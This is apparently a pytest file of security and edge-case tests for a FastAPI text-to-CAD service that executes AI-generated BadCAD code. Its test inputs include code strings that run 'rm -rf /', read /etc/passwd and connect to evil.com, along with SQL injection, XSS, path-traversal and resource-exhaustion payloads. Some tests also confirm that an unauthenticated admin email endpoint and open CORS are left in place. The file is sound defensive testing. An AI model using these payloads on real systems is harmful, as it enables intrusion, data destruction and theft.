"""
Security and edge case tests for the Text-to-CAD API
"""

import pytest
from unittest.mock import patch, Mock
from fastapi.testclient import TestClient
import sys
from pathlib import Path

# Add parent directory to path
sys.path.insert(0, str(Path(__file__).parent.parent))

# Mock dependencies
with patch("app.load_dotenv"):
    with patch("app.badcad"):
        with patch("app.genai"):
            from app import app, execute_badcad_and_export

client = TestClient(app)


class TestSecurityConcerns:
    """Test security-related issues"""

    def test_malicious_code_execution_attempt(self):
        """Test that malicious code attempts are handled"""
        malicious_codes = [
            "import os; os.system('rm -rf /')",
            "__import__('subprocess').call(['ls', '-la'])",
            "open('/etc/passwd', 'r').read()",
            "exec(compile('import socket; socket.socket().connect((\"evil.com\", 1337))', 'x', 'exec'))",
        ]

        for code in malicious_codes:
            with patch("app.BADCAD_AVAILABLE", True):
                with patch("builtins.exec") as mock_exec:
                    # Even if exec is called, we don't want it to actually run
                    mock_exec.side_effect = Exception("Execution blocked for test")

                    # This should create a fallback STL, not execute the malicious code
                    stl_path = execute_badcad_and_export(code, "security_test")

                    # Should still produce an STL file (fallback)
                    assert stl_path.endswith(".stl")

    def test_sql_injection_in_user_id(self):
        """Test SQL injection attempts in user_id field"""
        response = client.post(
            "/api/user/info",
            json={
                "user_id": "'; DROP TABLE users; --",
                "email": "hacker@evil.com",
                "name": "Bobby Tables",
            },
        )

        # Should handle gracefully since we're using in-memory dict
        assert response.status_code == 200
        data = response.json()
        assert data["success"] is True

    def test_xss_in_prompt(self):
        """Test XSS attempts in prompt field"""
        xss_prompt = "<script>alert('XSS')</script>Create a cube"

        with patch("app.generate_badcad_code_with_gemini") as mock_gemini:
            with patch("app.execute_badcad_and_export") as mock_execute:
                mock_gemini.return_value = (
                    "from badcad import *\nmodel = cube(10,10,10)"
                )
                mock_execute.return_value = "/tmp/safe.stl"

                response = client.post("/api/generate", json={"prompt": xss_prompt})

                assert response.status_code == 200
                # The XSS should be passed to AI but not executed
                mock_gemini.assert_called_with(xss_prompt)

    def test_path_traversal_in_download(self):
        """Test path traversal attempts in download endpoint"""
        dangerous_ids = [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\config\\sam",
            "/etc/passwd",
            "C:\\Windows\\System32\\config\\SAM",
        ]

        for dangerous_id in dangerous_ids:
            response = client.get(f"/api/download/{dangerous_id}")

            # Should return 404, not expose system files
            assert response.status_code == 404
            assert "Model not found" in response.json()["detail"]

    def test_admin_endpoint_no_auth(self):
        """Test that admin endpoint is accessible without auth (security issue)"""
        response = client.get("/api/admin/collected-emails")

        # Currently returns 200 - this is a security issue!
        assert response.status_code == 200
        # This test documents the security issue

    def test_cors_all_origins(self):
        """Test CORS configuration allows all origins (security issue)"""
        response = client.options(
            "/api/generate",
            headers={
                "Origin": "http://evil-site.com",
                "Access-Control-Request-Method": "POST",
            },
        )

        # Currently allows all origins - this is a security issue!
        assert response.status_code == 200
        # This test documents the security issue


class TestEdgeCases:
    """Test edge cases and boundary conditions"""

    def test_empty_prompt(self):
        """Test empty prompt handling"""
        response = client.post("/api/generate", json={"prompt": ""})

        assert response.status_code == 400
        assert "No prompt provided" in response.json()["detail"]

    def test_very_long_prompt(self):
        """Test handling of very long prompts"""
        long_prompt = "Create a cube " * 1000  # Very long prompt

        with patch("app.generate_badcad_code_with_gemini") as mock_gemini:
            with patch("app.execute_badcad_and_export") as mock_execute:
                mock_gemini.return_value = (
                    "from badcad import *\nmodel = cube(10,10,10)"
                )
                mock_execute.return_value = "/tmp/test.stl"

                response = client.post("/api/generate", json={"prompt": long_prompt})

                assert response.status_code == 200

    def test_unicode_in_prompt(self):
        """Test Unicode characters in prompt"""
        unicode_prompt = "创建一个立方体 🎲 with émojis and ñ characters"

        with patch("app.generate_badcad_code_with_gemini") as mock_gemini:
            with patch("app.execute_badcad_and_export") as mock_execute:
                mock_gemini.return_value = (
                    "from badcad import *\nmodel = cube(10,10,10)"
                )
                mock_execute.return_value = "/tmp/test.stl"

                response = client.post("/api/generate", json={"prompt": unicode_prompt})

                assert response.status_code == 200

    def test_null_values_in_request(self):
        """Test handling of null values"""
        response = client.post(
            "/api/generate", json={"prompt": "Create a cube", "user_id": None}
        )

        with patch("app.generate_badcad_code_with_gemini") as mock_gemini:
            with patch("app.execute_badcad_and_export") as mock_execute:
                mock_gemini.return_value = (
                    "from badcad import *\nmodel = cube(10,10,10)"
                )
                mock_execute.return_value = "/tmp/test.stl"

                assert response.status_code == 200

    def test_concurrent_requests_same_user(self):
        """Test handling of concurrent requests from same user"""
        from threading import Thread
        import queue

        user_id = "concurrent_user"
        results = queue.Queue()

        # Set up user
        from app import user_database

        user_database[user_id] = {
            "email": "concurrent@test.com",
            "name": "Concurrent User",
            "model_count": 8,  # Near limit
        }

        def make_request():
            response = client.post(
                "/api/user/increment-count", json={"user_id": user_id}
            )
            results.put(response.status_code)

        # Start 5 concurrent requests
        threads = []
        for _ in range(5):
            t = Thread(target=make_request)
            threads.append(t)
            t.start()

        # Wait for all threads
        for t in threads:
            t.join()

        # Check results - some should succeed, some should fail
        status_codes = []
        while not results.empty():
            status_codes.append(results.get())

        # At most 2 should succeed (bringing count from 8 to 10)
        success_count = status_codes.count(200)
        assert success_count <= 2
        assert 403 in status_codes  # Some should be rejected

    def test_model_id_collision(self):
        """Test handling of model ID collisions"""
        from app import temp_models

        # Pre-populate with existing model
        existing_id = "test_model_123"
        temp_models[existing_id] = "/tmp/existing.stl"

        with patch("uuid.uuid4") as mock_uuid:
            # Force same UUID
            mock_uuid.return_value.hex = existing_id

            with patch("app.generate_badcad_code_with_gemini") as mock_gemini:
                with patch("app.execute_badcad_and_export") as mock_execute:
                    mock_gemini.return_value = (
                        "from badcad import *\nmodel = cube(10,10,10)"
                    )
                    mock_execute.return_value = "/tmp/new.stl"

                    response = client.post(
                        "/api/generate", json={"prompt": "Create a cube"}
                    )

                    # Should still work, overwriting the old entry
                    assert response.status_code == 200

    def test_special_characters_in_email(self):
        """Test special characters in email addresses"""
        special_emails = [
            "user+tag@example.com",
            "user.name@sub.domain.com",
            "user_123@example-site.com",
            '"user@name"@example.com',
        ]

        for email in special_emails:
            response = client.post(
                "/api/user/info",
                json={
                    "user_id": f"user_{email.replace('@', '_at_')}",
                    "email": email,
                    "name": "Special User",
                },
            )

            assert response.status_code == 200

    def test_badcad_infinite_loop_protection(self):
        """Test protection against infinite loops in BadCAD code"""
        infinite_loop_code = """
from badcad import *
while True:
    x = 1
model = cube(10, 10, 10)
"""

        with patch("app.BADCAD_AVAILABLE", True):
            # The execute function should handle this gracefully
            # In real implementation, you'd want a timeout
            stl_path = execute_badcad_and_export(infinite_loop_code, "infinite_test")

            # Should create some output (likely fallback)
            assert stl_path.endswith(".stl")

    def test_memory_exhaustion_protection(self):
        """Test protection against memory exhaustion attempts"""
        memory_bomb_code = """
from badcad import *
huge_list = [0] * (10**9)  # Try to allocate huge memory
model = cube(10, 10, 10)
"""

        with patch("app.BADCAD_AVAILABLE", True):
            # Should handle gracefully
            stl_path = execute_badcad_and_export(memory_bomb_code, "memory_test")

            # Should create some output (likely fallback)
            assert stl_path.endswith(".stl")


class TestDataValidation:
    """Test input validation and sanitization"""

    def test_invalid_json_format(self):
        """Test handling of invalid JSON"""
        response = client.post(
            "/api/generate",
            content="{'invalid': json syntax}",
            headers={"Content-Type": "application/json"},
        )

        assert response.status_code == 422  # Unprocessable Entity

    def test_missing_required_fields(self):
        """Test missing required fields"""
        # Missing prompt
        response = client.post("/api/generate", json={})
        assert response.status_code == 422

        # Missing code
        response = client.post("/api/execute", json={})
        assert response.status_code == 422

        # Missing user_id in increment
        response = client.post("/api/user/increment-count", json={})
        assert response.status_code == 422

    def test_wrong_field_types(self):
        """Test wrong field types"""
        # Prompt as number
        response = client.post("/api/generate", json={"prompt": 12345})
        assert response.status_code == 422

        # User ID as number
        response = client.post(
            "/api/user/info",
            json={"user_id": 123, "email": "test@example.com", "name": "Test"},
        )
        assert response.status_code == 422

    def test_additional_unexpected_fields(self):
        """Test handling of unexpected fields"""
        response = client.post(
            "/api/generate",
            json={
                "prompt": "Create a cube",
                "user_id": "test_user",
                "unexpected_field": "should be ignored",
                "another_field": 123,
            },
        )

        with patch("app.generate_badcad_code_with_gemini") as mock_gemini:
            with patch("app.execute_badcad_and_export") as mock_execute:
                mock_gemini.return_value = (
                    "from badcad import *\nmodel = cube(10,10,10)"
                )
                mock_execute.return_value = "/tmp/test.stl"

                # Should work, ignoring extra fields
                assert response.status_code == 200


if __name__ == "__main__":
    pytest.main([__file__, "-v"])
